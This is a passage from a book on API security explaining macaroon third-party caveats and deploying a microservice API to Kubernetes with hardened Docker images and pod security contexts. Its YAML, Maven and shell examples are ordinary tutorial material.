to the third-party service.  DEFINITION A discharge macaroon is obtained by a client from a third-party ser- vice to prove that a third-party caveat is satisfied. A third-party service is any service that isn’t the client or the server it is trying to access. The discharge macaroon is cryptographically bound to the original macaroon such that the API can ensure that the condition has been satisfied without talking directly to the third-party service.  Third-party caveats provide the basis for loosely coupled decentralized authorization and provide some interesting properties:   The API doesn’t need to directly communicate with the third-party service.  No  details  about  the  query  being  answered  by  the  third-party  service  are  dis- closed to the client. This can be important if the query contains personal infor- mation about a user.   The discharge macaroon proves that the caveat is satisfied without revealing any  details to the client or the API.   Because  the  discharge  macaroon  is  itself  a  macaroon,  the  third-party  service can attach additional caveats to it that the client must satisfy before it is granted access, including further third-party caveats.  For example, a client might be issued with a long-term macaroon token to performing banking activities on behalf of a user, such as initiating payments from their account. As well as first-party caveats restricting how much the client can transfer in a single trans- action, the bank might attach a third-party  caveat that requires the client to obtain authorization for each payment from a transaction authorization service. The transac- tion  authorization  service  checks  the  details  of  the  transaction  and  potentially  con- firms the transaction directly with the user before issuing a discharge macaroon tied to that one transaction. This pattern of having a single long-lived token providing gen- eral access, but then requiring short-lived discharge macaroons to authorize specific transactions is a perfect use case for third-party caveats.   Macaroons: Tokens with caveats  329  CREATING THIRD-PARTY CAVEATS Unlike a first-party caveat, which is a simple string, a third-party caveat has three com- ponents:   A location hint telling the client where to locate the third-party service.  A unique unguessable secret string, which will be used to derive a new HMAC  key that the third-party service will use to sign the discharge macaroon.   An identifier for the caveat that the third-party can use to identify the query.  This identifier is public and so shouldn’t reveal the secret.  To  add  a  third-party  caveat  to  a  macaroon,  you  use  the  add_third_party_caveat method on the MacaroonsBuilder object:      macaroon = MacaroonsBuilder.modify macaroon               .add_third_party_caveat "https:  auth.example.com",               secret, caveatId                                          .getMacaroon  ;  Modify an existing  macaroon to add a caveat.  Add the third- party caveat.  The unguessable secret should be generated with high entropy, such as a 256-bit value from a SecureRandom:  var key = new byte[32]; new SecureRandom  .nextBytes key ; var secret = Base64.getEncoder  .encodeToString key ;  When you add a third-party caveat to a macaroon, this secret is encrypted so that only the API that verifies the macaroon will be able to decrypt it. The party appending the caveat also needs to communicate the secret and the query to be verified to the third- party service. There are two ways to accomplish this, with different trade-offs:   The caveat appender can encode the query and the secret into a message and encrypt it using a public key from the third-party service. The encrypted value is then used as the identifier for the third-party caveat. The third-party can then decrypt the identifier to discover the query and secret. The advantage of this approach is that the API doesn’t need to directly talk to the third-party service, but the encrypted identifier may be quite large.   Alternatively,  the  caveat  appender  can  contact  the  third-party  service  directly  via a REST API, for example  to register the caveat and secret. The third-party service would then store these and return a random value  known as a ticket  that can be used as the caveat identifier. When the client presents the identifier to the third-party it can look up the query and secret in its local storage based on the ticket. This solution is likely to produce smaller identifiers, but at the cost of additional network requests and storage at the third-party service.  There’s currently no standard for either of these two options describing what the API for  registering  a  caveat  would  look  like  for  the  second  option,  or  which  public  key encryption algorithm and message format would be used for the first. There is also no   330  CHAPTER 9 Capability-based security and macaroons  standard describing how a client presents the caveat identifier to the third-party ser- vice.  In  practice,  this  limits  the  use  of  third-party  caveats  because  client  developers need to know how to integrate with each service individually, so they are typically only used within a closed ecosystem.

For example, if you redirect the user to an external login service, the fragment com- ponent is not sent to the server and is not included in Referer headers.  6 a and d. 7 b, c, and e.  Summary   Capability URIs can be used to provide fine-grained access to individual resources via your API. A capability URI combines an identifier for a resource along with a set of permissions to access that resource.   As  an  alternative  to  identity-based  access  control,  capabilities  avoid  ambient  authority that can lead to confused deputy attacks and embrace POLA.   Summary  331   There are many ways to form capability URIs that have different trade-offs. The simplest forms encode a random token into the URI path or query parameters. More secure variants encode the token into the fragment or userinfo compo- nents but come at a cost of increased complexity for clients.   Tying a capability URI to a user session increases the security of both, because it reduces the risk of capability tokens being stolen and can be used to prevent CSRF attacks. This makes it harder to share capability URIs.   Macaroons allow anybody to restrict a capability by appending caveats that can be cryptographically verified and enforced by an API. Contextual caveats can be appended just before a macaroon is used to secure a token against misuse.   First-party caveats encode simple conditions that can be checked locally by an API, such as restricted the time of day at which a token can be used. Third-party caveats require the client to obtain a discharge macaroon from an external ser- vice proving that it satisfies a condition, such that the user is an employee of a certain company or is over 18 years old.    Part 4  Microservice APIs in Kubernetes  The  Kubernetes  project  has  exploded  in  popularity  in  recent  years  as  the  preferred  environment  for  deploying  server  software.  That  growth  has  been accompanied by a shift to microservice architectures, in which complex applica- tions are split into separate components communicating over service-to-service APIs.  In  this  part  of  the  book,  you’ll  see  how  to  deploy  microservice  APIs  in Kubernetes and secure them from threats.   Chapter 10 is a lightning tour of Kubernetes and covers security best prac- tices for deploying services in this environment. You’ll look at preventing com- mon attacks against internal APIs and how to harden the environment against attackers.    After  hardening  the  environment,  chapter  11  discusses  approaches  to authentication  in  service-to-service  API  calls.  You’ll  see  how  to  use  JSON  Web Tokens and OAuth2 and how to harden these approaches in combination with mutual  TLS  authentication.  The  chapter  concludes  by  looking  at  patterns  for end-to-end authorization when a single user API request triggers multiple inter- nal API calls between microservices.       Microservice APIs in Kubernetes  This chapter covers  Deploying an API to Kubernetes  Hardening Docker container images  Setting up a service mesh for mutual TLS  Locking down the network using network policies  Supporting external clients with an ingress   controller  In the chapters so far, you have learned how to secure user-facing APIs from a vari- ety  of  threats  using  security  controls  such  as  authentication,  authorization,  and rate-limiting. It’s increasingly common for applications to themselves be structured as a set of microservices, communicating with each other using internal APIs intended to be used by other microservices rather than directly by users. The example in fig- ure 10.1 shows a set of microservices implementing a fictional web store. A single user-facing API provides an interface for a web application, and in turn, calls sev- eral backend microservices to handle stock checks, process payment card details, and arrange for products to be shipped once an order is placed.  DEFINITION A  microservice  is  an  independently  deployed  service  that  is  a component of a larger application. Microservices are often contrasted with  335   336  CHAPTER 10 Microservice APIs in Kubernetes  monoliths, where all the components of an application are bundled into a sin- gle  deployed  unit.  Microservices  communicate  with  each  other  using  APIs over a protocol such as HTTP.  Some microservices may also need to call APIs provided by external services, such as a third-party  payment  processor.  In  this  chapter,  you’ll  learn  how  to  securely  deploy microservice APIs as Docker containers on Kubernetes, including how to harden con- tainers and the cluster network to reduce the risk of compromise, and how to run TLS at scale using Linkerd  https:  linkerd.io  to secure microservice API communications.  Each backend service may have a different database.  Authentication  Users  Inventory  Stock  Web frontend  API  Payment processing  Frontend services may call many backend services.  Shipping  Some microservices may call external APIs to get their jobs done.  Figure 10.1 In a microservices architecture, a single application is broken into loosely  coupled services that communicate using remote APIs. In this example, a fictional web  store has an API for web clients that calls to internal services to check stock levels,  process payments, and arrange shipping when an order is placed.  10.1 Microservice APIs on Kubernetes  Although  the  concepts  in  this  chapter  are  applicable  to  most  microservice  deploy- ments, in recent years the Kubernetes project  https:  kubernetes.io  has emerged as a leading approach to deploying and managing microservices in production. To keep   Microservice APIs on Kubernetes  337  things concrete, you’ll use Kubernetes to deploy the examples in this part of the book. Appendix B has detailed instructions on how to set up the Minikube environment for running Kubernetes on your development machine. You should follow those instruc- tions now before continuing with the chapter.   The basic concepts of Kubernetes relevant to deploying an API are shown in fig- ure 10.2. A Kubernetes cluster consists of a set of nodes, which are either physical or virtual machines  VMs  running the Kubernetes software. When you deploy an app to the cluster, Kubernetes replicates the app across nodes to achieve availability and scal- ability requirements that you specify. For example, you might specify that you always require at least three copies of your app to be running, so that if one fails the other two can handle the load. Kubernetes ensures these availability goals are always satis- fied and redistributing apps as nodes are added or removed from the cluster. An app is implemented by one or more pods, which encapsulate the software needed to run that app. A pod is itself made up of one or more Linux containers, each typically run- ning a single process such as an HTTP API server.  DEFINITION A Kubernetes node is a physical or virtual machine that forms part of the Kubernetes cluster. Each node runs one or more pods that implement  A node is a machine that can run containers. It might be a physical machine or a VM.  A service is implemented by a collection of pods, all running the same containers.  Service A  Service B  Node  Pod  Container  Pod  Container  Container  Node  Pod  Container  Container  Related containers are grouped together into pods.  A container is typically a single process.  Figure 10.2 In Kubernetes, an app is implemented by one or more identical pods  running on physical or virtual machines known as nodes. A pod itself is a collection  of Linux containers, each of which typically has a single process running within it,  such as an API server.   338  CHAPTER 10 Microservice APIs in Kubernetes  apps running on the cluster. A pod is itself a collection of Linux containers and each container runs a single process such as an HTTP server.  A Linux container is the name given to a collection of technologies within the Linux operating system that allow a process  or collection of processes  to be isolated from other processes so that it sees its own view of the file system, network, users, and other shared resources. This simplifies packaging and deployment, because different pro- cesses  can  use  different  versions  of  the  same  components,  which  might  otherwise cause conflicts. You can even run entirely different distributions of Linux within con- tainers simultaneously on the same operating system kernel. Containers also provide security benefits, because processes can be locked down within a container such that it is much harder for an attacker that compromises one process to break out of the con- tainer and affect other processes running in different containers or the host operating system. In this way, containers provide some of  the benefits of VMs, but with  lower overhead.  Several  tools  for  packaging  Linux  containers  have  been  developed,  the most famous of which is Docker  https:  www.docker.com , which many Kubernetes deployments build on top of.  LEARN  ABOUT  IT Securing  Linux  containers  is  a  complex  topic,  and  we’ll cover only the basics of in this book. The NCC Group have published a freely available 123-page guide to hardening containers at http:  mng.bz wpQQ.  In most cases, a pod should contain only a single main container and that container should run only a single process. If the process  or node  dies, Kubernetes will restart the pod automatically, possibly on a different node. There are two general exceptions to the one-container-per-pod rule:   An init container runs before any other containers in the pod and can be used to perform initialization tasks, such as waiting for other services to become avail- able. The main container in a pod will not be started until all init containers have completed.   A  sidecar  container  runs  alongside  the  main  container  and provides  additional services. For example, a sidecar container might implement a reverse proxy for an API server running in the main container, or it might periodically update data files on a filesystem shared with the main container.  For the most part, you don’t need to worry about these different kinds of containers in this chapter and can stick to the one-container-per-pod rule. You’ll see an example of a sidecar container when you learn about the Linkerd service mesh in section 10.3.2.  A Kubernetes cluster can be highly dynamic with pods being created and destroyed or moved from one node to another to achieve performance and availability goals. This makes  it  challenging  for  a  container  running  in  one  pod  to  call  an  API  running  in another pod, because the IP address may change depending on what node  or nodes  it happens to be running on. To solve this problem, Kubernetes has the concept of a ser- vice, which provides a way for pods to find other pods within the cluster. Each service   Deploying Natter on Kubernetes  339  running within Kubernetes is given a unique virtual IP address that is unique to that ser- vice, and Kubernetes keeps track of which pods implement that service. In a microser- vice architecture, you would register each microservice as a separate Kubernetes service. A process running in a container can call another microservice’s API by making a net- work  request  to  the  virtual  IP  address  corresponding  to  that  service.  Kubernetes  will intercept the request and redirect it to a pod that implements the service.   DEFINITION A Kubernetes service provides a fixed virtual IP address that can be used to send API requests to microservices within the cluster. Kubernetes will route the request to a pod that implements the service.  As pods and nodes are created and deleted, Kubernetes updates the service metadata to ensure that requests are always sent to an available pod for that service. A DNS ser- vice is also typically running within a Kubernetes cluster to convert symbolic names for services, such as payments.myapp.svc.example.com, into its virtual IP address, such as 192.168.0.12. This allows your microservices to make HTTP requests to hard-coded URIs and rely on Kubernetes to route the request to an appropriate pod. By default, services are accessible internally only within the Kubernetes network, but you can also publish a service to a public IP address either directly or using a reverse proxy or load balancer. You’ll learn how to deploy a reverse proxy in section 10.4.  Pop quiz 1  A Kubernetes pod contains which one of the following components? a Node b Service c Container d Service mesh e Namespace  2  True or False: A sidecar container runs to completion before the main container starts.  The answers are at the end of the chapter.  10.2 Deploying Natter on Kubernetes  In this section, you’ll learn how to deploy a real API into Kubernetes and how to con- figure pods and services to allow microservices to talk to each other. You’ll also add a new link-preview microservice as an example of securing microservice APIs that are not directly accessible to external users. After describing the new microservice, you’ll use the following steps to deploy the Natter API to Kubernetes:  1 Building the H2 database as a Docker container. 2 Deploying the database to Kubernetes. 3 Building the Natter API as a Docker container and deploying it.   340  CHAPTER 10 Microservice APIs in Kubernetes  4 Building the new link-preview microservice. 5 Deploying the new microservice and exposing it as a Kubernetes service. 6 Adjusting the Natter API to call the new microservice API.  You’ll then learn how to avoid common security vulnerabilities that the link-preview microservice  introduces  and  harden  the  network  against  common  attacks.  But  first let’s motivate the new link-preview microservice.    You’ve noticed that many Natter users are using the app to share links with each other. To improve the user experience, you’ve decided to implement a feature to gener- ate previews for these links. You’ve designed a new microservice that will extract links from messages and fetch them from the Natter servers to generate a small preview based on the metadata in the HTML returned from the link, making use of any Open Graph tags in the page  https:  ogp.me . For now, this service will just look for a title, descrip- tion, and optional image in the page metadata, but in future you plan to expand the ser- vice  to  handle  fetching  images  and  videos.  You’ve  decided  to  deploy  the  new  link- preview API as a separate microservice, so that an independent team can develop it.    Figure 10.3 shows the new deployment, with the existing Natter API and database joined by the new link-preview microservice. Each of the three components is imple- mented  by  a  separate  group  of  pods,  which  are  then  exposed  internally  as  three Kubernetes services:   The H2 database runs in one pod and is exposed as the natter-database-service.  The link-preview microservice runs in another pod and provides the natter-link-   The main Natter API runs in yet another pod and is exposed as the natter-  preview-service.  api-service.  The link-preview service generates previews by fetching any URLs found within Natter messages.  Services are deployed as separate pods.  Link-preview  service  apple.com  manning.com  google.com  Natter API  Natter  database  All other functions are handled by the original Natter API and database.  Figure 10.3 The link-preview API is  developed and deployed as a new  microservice, separate from the main  Natter API and running in different pods.   10.2.1 Building H2 database as a Docker container  Deploying Natter on Kubernetes  341  You’ll use a single pod for each service in this chapter, for simplicity, but Kubernetes allows you to run multiple copies of a pod on multiple nodes for performance and reliability:  if  a  pod   or  node  crashes,  it  can  then  redirect  requests  to  another  pod implementing the same service.   Separating the link-preview service from the main Natter API also has security ben- efits, because fetching and parsing arbitrary content from the internet is potentially risky. If this was done within the main Natter API process, then any mishandling of those requests could compromise user data or messages. Later in the chapter you’ll see examples of attacks that can occur against this link-preview API and how to lock down the environment to prevent them causing any damage. Separating potentially risky operations into their own environments is known as privilege separation.  DEFINITION Privilege separation is a design technique based on extracting poten- tially risky operations into a separate process or environment that is isolated from  the  main  process.  The  extracted  process  can  be  run  with  fewer  privi- leges, reducing the damage if it is ever compromised.  Before you develop the new link-preview service, you’ll get the main Natter API run- ning on Kubernetes with the H2 database running as a separate service.   Although  the  H2  database  you’ve  used  for  the  Natter  API  in  previous  chapters  is intended primarily for embedded use, it does come with a simple server that can be used for remote access. The first step of running the Natter API on Kubernetes is to build a Linux container for running the database. There are several varieties of Linux container; in this chapter, you’ll build a Docker container  as that is the default used by the Minikube environment  to run Kubernetes on a local developer machine. See appendix B for detailed instructions on how to install and configure Docker and Mini- kube. Docker container images are built using a Dockerfile, which is a script that describes how to build and run the software you need.  DEFINITION A container image is a snapshot of a Linux container that can be used to create many identical container instances. Docker images are built in layers from a base image that specifies the Linux distribution such as Ubuntu or Debian. Different containers can share the base image and apply differ- ent  layers  on  top,  reducing  the  need  to  download  and  store  large  images multiple times.  Because  there  is  no  official  H2  database  Docker  file,  you  can  create  your  own,  as shown in listing 10.1. Navigate to the root folder of the Natter project and create a new folder named docker and then create a folder inside there named h2. Create a new file named Dockerfile in the new docker h2 folder you just created with the contents of the listing. A Dockerfile consists of the following components:   A base image, which is typically a Linux distribution such as Debian or Ubuntu.  The base image is specified using the FROM statement.   342  CHAPTER 10 Microservice APIs in Kubernetes   A series of commands telling Docker how to customize that base image for your app. This includes installing software, creating user accounts and permissions, or setting up environment variables. The commands are executed within a con- tainer running the base image.  DEFINITION A base image is a Docker container image that you use as a starting point for creating your own images. A Dockerfile modifies a base image to install additional dependencies and configure permissions.  The Dockerfile in the listing downloads the latest release of H2, verifies its SHA-256 hash to ensure the file hasn’t changed, and unpacks it. The Dockerfile uses curl to download the H2 release and sha256sum to verify the hash, so you need to use a base image  that  includes  these  commands.  Docker  runs  these  commands  in  a  container running the base image, so it will fail if these commands are not available, even if you have curl and sha256sum installed on your development machine.   To reduce the size of the final image and remove potentially vulnerable files, you can then copy the server binaries into a different, minimal base image. This is known as a Docker multistage build and is useful to allow the build process to use a full-featured image while the final image is based on something more stripped-down. This is done in  listing  10.1  by  adding  a  second  FROM  command  to  the  Dockerfile,  which  causes Docker to switch to the new base image. You can then copy files from the build image using the COPY --from command as shown in the listing.  DEFINITION A  Docker  multistage  build  allows  you  to  use  a  full-featured  base image  to  build  and  configure  your  software  but  then  switch  to  a  stripped- down base image to reduce the size of the final image.   In this case, you can use Google’s distroless base image, which contains just the Java 11 runtime and its dependencies and nothing else  not even a shell . Once you’ve cop- ied  the  server files into the base image,  you can then  expose  port  9092  so  that  the server can be accessed from outside the container and configure it to use a non-root user  and  group  to  run  the  server.  Finally,  define  the  command  to  run  to  start  the server using the ENTRYPOINT command.  TIP Using a minimal base image such as the Alpine distribution or Google’s distroless images reduces the attack surface of potentially vulnerable software and limits further attacks that can be carried out if the container is ever com- promised.  In  this  case,  an  attacker  would  be  quite  happy  to  find  curl  on  a compromised  container,  but  this  is  missing  from  the  distroless  image  as  is almost  anything  else  they  could  use  to  further  an  attack.  Using  a  minimal image  also  reduces  the  frequency  with  which  you’ll  need  to  apply  security updates to patch known vulnerabilities in the distribution because the vulner- able components are not present.

Linux users and UIDs When you log in to a Linux operating system  OS  you typically use a string username such as “guest” or “root.” Behind the scenes, Linux maps these usernames into 32- bit integer UIDs  user IDs . The same happens with group names, which are mapped to integer GIDs  group IDs . The mapping between usernames and UIDs is done by the  etc passwd file, which can differ inside a container from the host OS. The root user always has a UID of 0. Normal users usually have UIDs starting at 500 or 1000. All permissions to access files and other resources are determined by the operating system in terms of UIDs and GIDs rather than user and group names, and a process can run with a UID or GID that doesn’t correspond to any named user or group.  By default, UIDs and GIDs within a container are identical to those in the host. So UID 0 within the container is the same as UID 0 outside the container: the root user. If you run a process inside a container with a UID that happens to correspond to an existing user in the host OS, then the container process will inherit all the permissions of that user on the host. For added security, your Docker images can create a new user and group and let the kernel assign an unused UID and GID without any existing permis- sions in the host OS. If an attacker manages to exploit a vulnerability to gain access to the host OS or filesystem, they will have no  or very limited  permissions.  A Linux user namespace can be used to map UIDs within the container to a different range of UIDs on the host. This allows a process running as UID 0  root  within a container to be mapped to a non-privileged UID such as 20000 in the host. As far as the container is concerned, the process is running as root, but it would not have root   344  CHAPTER 10 Microservice APIs in Kubernetes   continued  privileges if it ever broke out of the container to access the host. See  https:  docs .docker.com engine security userns-remap  for how to enable a user namespace in Docker. This is not yet possible in Kubernetes, but there are several alternative options for reducing user privileges inside a pod that are discussed later in the chapter.  When you build a Docker image, it gets cached by the Docker daemon that runs the build process. To use the image elsewhere, such as within a Kubernetes cluster, you must  first  push  the  image  to  a  container  repository  such  as  Docker  Hub   https:   hub.docker.com  or a private repository within your organization. To avoid having to configure a repository and credentials in this chapter, you can instead build directly to the Docker daemon used by Minikube by running the following commands in your terminal shell. You should specify version 1.16.2 of Kubernetes to ensure compatibility with the examples in this book. Some of the examples require Minikube to be run- ning with at least 4GB of RAM, so use the --memory flag to specify that.  minikube start \     --kubernetes-version=1.16.2 \          --memory=4096         Enable the latest  Kubernetes version.  Specify 4GB of RAM.  You should then run  eval $ minikube docker-env   so that any subsequent Docker commands in the same console instance will use Mini- kube’s Docker daemon. This ensures Kubernetes will be able to find the images with- out  needing  to  access  an  external  repository.  If  you  open  a  new  terminal  window, make sure to run this command again to set the environment correctly.  LEARN ABOUT IT Typically in a production deployment, you’d configure your DevOps  pipeline  to  automatically  push  Docker  images  to  a  repository  after they  have  been  thoroughly  tested  and  scanned  for  known  vulnerabilities. Setting up such a workflow is outside the scope of this book but is covered in  detail  in  Securing  DevOps  by  Julien  Vehent   Manning,  2018;  http:  mng .bz qN52 .  You can now build the H2 Docker image by typing the following commands in the same shell:  cd docker h2 docker build -t apisecurityinaction h2database .  This  may  take  a  long  time  to  run  the  first  time  because  it  must  download  the  base images, which are quite large. Subsequent builds will be faster because the images are   10.2.2 Deploying the database to Kubernetes  Deploying Natter on Kubernetes  345  cached locally. To test the image, you can run the following command and check that you see the expected output:  $ docker run apisecurityinaction h2database TCP server running at tcp:  172.17.0.5:9092  others can connect  If you want to stop the container press Ctrl-C.  TIP If you want to try connecting to the database server, be aware that the IP address displayed is for Minikube’s internal virtual networking and is usually not directly accessible. Run the command minikube ip at the prompt to get an IP address you can use to connect from the host OS.  To deploy the database to the Kubernetes cluster, you’ll need to create some configu- ration files describing how it is to be deployed. But before you do that, an important first  step  is  to  create  a  separate  Kubernetes namespace  to  hold  all  pods  and  services related to the Natter API. A namespace provides a level of isolation when unrelated services need to run on the same cluster and makes it easier to apply other security policies such as the networking policies that you’ll apply in section 10.3. Kubernetes provides several ways to configure objects in the cluster, including namespaces, but it’s a good idea to use declarative configuration files so that you can check these into Git or another version-control system, making it easier to review and manage security con- figuration  over  time.  Listing  10.2  shows  the  configuration  needed  to  create  a  new namespace for the Natter API. Navigate to the root folder of the Natter API project and create a new sub-folder named “kubernetes.” Then inside the folder, create a new file  named  natter-namespace.yaml  with  the  contents  of  listing  10.2.  The  file  tells Kubernetes to make sure that a namespace exists with  the name  natter-api and a matching label.  WARNING YAML  https:  yaml.org  configuration files are sensitive to inden- tation and other whitespace. Make sure you copy the file exactly as it is in the listing. You may prefer to download the finished files from the GitHub repos- itory accompanying the book  http:  mng.bz 7Gly .  Listing 10.2 Creating the namespace  apiVersion: v1 kind: Namespace     metadata:   name: natter-api         labels:                    name: natter-api      Use the Namespace kind  to create a namespace.  Specify a name  and label for the  namespace.  NOTE Kubernetes  configuration  files  are  versioned  using  the  apiVersion attribute. The exact version string depends on the type of resource and version of the Kubernetes software you’re using. Check the Kubernetes documentation   346  CHAPTER 10 Microservice APIs in Kubernetes   https:  kubernetes.io docs home   for the correct apiVersion when writ- ing a new configuration file.  To create the namespace, run the following command in your terminal in the root folder of the natter-api project:  kubectl apply -f kubernetes natter-namespace.yaml  The kubectl apply command instructs Kubernetes to make changes to the cluster to match the desired state specified in the configuration file. You’ll use the same com- mand to create all the Kubernetes objects in this chapter. To check that the name- space is created, use the kubectl get namespaces command:  $ kubectl get namespaces  Your output will look similar to the following:  NAME              STATUS   AGE default           Active   2d6h kube-node-lease   Active   2d6h kube-public       Active   2d6h kube-system       Active   2d6h natter-api        Active   6s  You can now create the pod to run the H2 database container you built in the last sec- tion. Rather than creating the pod directly, you’ll instead create a deployment, which describes which pods to run, how many copies of the pod to run, and the security attri- butes to apply to those pods. Listing 10.3 shows a deployment configuration for the H2 database with a basic set of security annotations to restrict the permissions of the pod in case it ever gets compromised. First you define the name and namespace to run the deployment in, making sure to use the namespace that you defined earlier. A deployment specifies the pods to run by using a selector that defines a set of labels that matching pods will have. In listing 10.3, you define the pod in the template section of the same file, so make sure the labels are the same in both parts.   NOTE Because you are using an image that you built directly to the Minikube Docker  daemon,  you  need  to  specify  imagePullPolicy:  Never  in  the  con- tainer  specification  to  prevent  Kubernetes  trying  to  pull  the  image  from  a repository.  In  a  real  deployment,  you  would  have  a  repository,  so  you’d remove this setting.  You can also specify a set of standard security attributes in the securityContext section for both the pod and for individual containers, as shown in the listing. In this case, the definition ensures that all containers in the pod run as a non-root user, and that it is not possible to bypass the default permissions by setting the following properties:   runAsNonRoot:  true ensures that the container is not accidentally run as the root user. The root user inside a container is the root user on the host OS and can sometimes escape from the container.   Deploying Natter on Kubernetes  347   allowPrivilegeEscalation: false ensures that no process run inside the con- tainer  can  have  more  privileges  than  the  initial  user.  This  prevents  the  con- tainer  executing  files  marked  with  set-UID  attributes  that  run  as  a  different user, such as root.   readOnlyRootFileSystem: true makes the entire filesystem inside the container read-only, preventing an attacker from altering any system files. If your container needs to write files, you can mount a separate persistent storage volume.   capabilities: drop: - all removes all Linux capabilities assigned to the container. This ensures that if an attacker does gain root access, they are severely limited in what  they  can  do.  Linux  capabilities  are  subsets  of  full  root  privileges  and  are unrelated to the capabilities you used in chapter 9.  LEARN ABOUT IT For more information on configuring the security context of a pod, refer to http:  mng.bz mN12. In addition to the basic attributes specified here, you can enable more advanced sandboxing features such as AppArmor, SELinux, or seccomp. These features are beyond the scope of this book. A start- ing point to learn more is the Kubernetes Security Best Practices talk given by Ian Lewis at Container Camp 2018  https:  www.youtube.com watch?v=v6a37uzFrCw .

Run kubectl apply -f kubernetes natter-database-deployment.yaml in the natter- api root folder to deploy the application.   To check that your pod is now running, you can run the following command:  $ kubectl get deployments --namespace=natter-api  This will result in output like the following:  NAME                         READY   UP-TO-DATE   AVAILABLE   AGE natter-database-deployment   1 1     1            1           10s  You can then check on individual pods in the deployment by running the following command  $ kubectl get pods --namespace=natter-api  which outputs a status report like this one, although the pod name will be different because Kubernetes generates these randomly:  NAME                                       READY   STATUS    RESTARTS   AGE natter-database-deployment-8649d65665-d58wb   1 1     Running   0       16s  Although the database is now running in a pod, pods are designed to be ephemeral and can come and go over the lifetime of the cluster. To provide a stable reference for other pods to connect to, you need to also define a Kubernetes service. A service pro- vides a stable internal IP address and DNS name that other pods can use to connect to the service. Kubernetes will route these requests to an available pod that implements the service. Listing 10.4 shows the service definition for the database.    First you need to give the service a name and ensure that it runs in the natter-api namespace. You define which pods are used to implement the service by defining a selector that matches the label of the pods defined in the deployment. In this case, you used the label app: natter-database when you defined the deployment, so use the  same  label  here  to  make  sure  the  pods  are  found.  Finally,  you  tell  Kubernetes which ports to expose for the service. In this case, you can expose port 9092. When a pod tries to connect to the service on port 9092, Kubernetes will forward the request to the same port on one of the pods that implements the service. If you want to use a different port, you can use the targetPort attribute to create a mapping between the service port and the port exposed by the pods. Create a new file named natter-data- base-service.yaml in the kubernetes folder with the contents of listing 10.4.   Listing 10.4 The database service  apiVersion: v1 kind: Service   Deploying Natter on Kubernetes  349  metadata:   name: natter-database-service          namespace: natter-api                spec:   selector:                         app: natter-database          ports:     - protocol: TCP           port: 9092         Expose the  database port.

Select all answers that apply. a Running as a non-root user b Disallowing privilege escalation c Dropping all unused Linux capabilities d Marking the root filesystem as read-only e Using base images with the most downloads on Docker Hub f Applying sandboxing features such as AppArmor or seccomp  The answer is at the end of the chapter.  10.2.3 Building the Natter API as a Docker container  For building the Natter API container, you can avoid writing a Dockerfile manually and make use of one of the many Maven plugins that will do this for you automatically. In this chapter, you’ll use the Jib plugin from Google  https:  github.com Google- ContainerTools jib ,  which  requires  a  minimal  amount  of  configuration  to  build  a container image.   Listing 10.5 shows how to configure the maven-jib-plugin to build a Docker con- tainer image for the Natter API. Open the pom.xml file in your editor and add the whole build section from listing 10.5 to the bottom of the file just before the closing   tag. The configuration instructs Maven to include the Jib plugin in the build process and sets several configuration options:   Set  the  name  of  the  output  Docker  image  to  build  to  “apisecurityinaction   natter-api.”   Set the name of the base image to use. In this case, you can use the distroless Java  11 image provided by Google, just as you did for the H2 Docker image.    350  CHAPTER 10 Microservice APIs in Kubernetes   Set the name of the main class to run when the container is launched. If there is  only one main method in your project, then you can leave this out.   Configure  any  additional  JVM  settings  to  use  when  starting  the  process.  The default settings are fine, but as discussed in chapter 5, it is worth telling Java to prefer to use the   dev urandom device for seeding SecureRandom instances to avoid potential performance issues. You can do this by setting the java.security .egd system property.   Configure the container to expose port 4567, which is the default port that our  API server will listen to for HTTP connections.   Finally, configure the container to run processes as a non-root user and group. In this case you can use a user with UID  user ID  and GID  group ID  of 1000.  Provide a name for the generated Docker image.  Listing 10.5 Enabling the Jib Maven plugin  Use the latest version of  the jib-maven-plugin.                     com.google.cloud.tools              jib-maven-plugin              2.4.0                                                     apisecurityinaction natter-api                                      gcr.io distroless java:11                                      ${exec.mainClass}       Add any                                                                 custom JVM              -Djava.security.egd=file: dev urandom      settings.                                                                                         4567                               1000:1000                                       Expose the port that the  API server listens to so that  clients can connect.  Specify a non-root  user and group to  run the process.  Specify the main  class to run.  Use a minimal base  image to reduce the  size and attack surface.  Before you build the Docker image, you should first disable TLS because this avoids configuration issues that will need to be resolved to get TLS working in the cluster. You  will  learn  how  to  re-enable  TLS  between  microservices  in  section  10.3.  Open Main.java in your editor and find the call to the secure   method. Comment out  or delete  the method call as follows:    secure "localhost.p12", "changeit", null, null ;       Comment out the secure    method to disable TLS.   Deploying Natter on Kubernetes  351  The API will still need access to the keystore for any HMAC or AES encryption keys. To ensure  that  the  keystore  is  copied  into  the  Docker  image,  navigate  to  the  src main folder in the project and create a new folder named “jib.” Copy the keystore.p12 file from the root of the project to the src main jib folder you just created. The jib-maven- plugin will automatically copy files in this folder into the Docker image it creates.   WARNING Copying  the  keystore  and  keys  directly  into  the  Docker  image  is poor  security  because  anyone  who  downloads  the  image  can  access  your secret keys. In chapter 11, you’ll see how to avoid including the keystore in this way and ensure that you use unique keys for each environment that your API runs in.  You also need to change the JDBC URL that the API uses to connect to the database. Rather than creating a local in-memory database, you can instruct the API to connect to the H2 database service you just deployed. To avoid having to create a disk volume to store data files, in this example you’ll continue using an in-memory database run- ning on the database pod. This is as simple as replacing the current JDBC database URL with the following one, using the DNS name of the database service you cre- ated earlier:  jdbc:h2:tcp:  natter-database-service:9092 mem:natter  Open the Main.java file and replace the existing JDBC URL with the new one in the code that creates the database connection pool. The new code should look as shown in listing 10.6.  Listing 10.6 Connecting to the remote H2 database  var jdbcUrl =                                                       "jdbc:h2:tcp:  natter-database-service:9092 mem:natter";    var datasource = JdbcConnectionPool.create      jdbcUrl, "natter", "password" ;               createTables datasource.getConnection   ; datasource = JdbcConnectionPool.create      jdbcUrl, "natter_api_user", "password" ;      var database = Database.forDataSource datasource ;  Use the same JDBC URL when  creating the schema and when  switching to the Natter API user.  Use the DNS name  of the remote  database service.  To build the Docker image for the Natter API with Jib, you can then simply run the fol- lowing Maven command in the same shell in the root folder of the natter-api project:  mvn clean compile jib:dockerBuild  You can now create a deployment to run the API in the cluster. Listing 10.7 shows the deployment configuration, which is almost identical to the H2 database deployment you created in the last section. Apart from specifying a different Docker image to run, you  should  also  make  sure  you  attach  a  different  label  to  the  pods  that  form  this deployment. Otherwise, the new pods will be included in the database deployment.   352  CHAPTER 10 Microservice APIs in Kubernetes  Create a new file named natter-api-deployment.yaml in the kubernetes folder with the contents of the listing.  Listing 10.7 The Natter API deployment  Give the API deployment a  unique name.  Ensure the labels for  the pods are different  from the database  pod labels.  apiVersion: apps v1 kind: Deployment metadata:   name: natter-api-deployment        namespace: natter-api spec:   selector:     matchLabels:       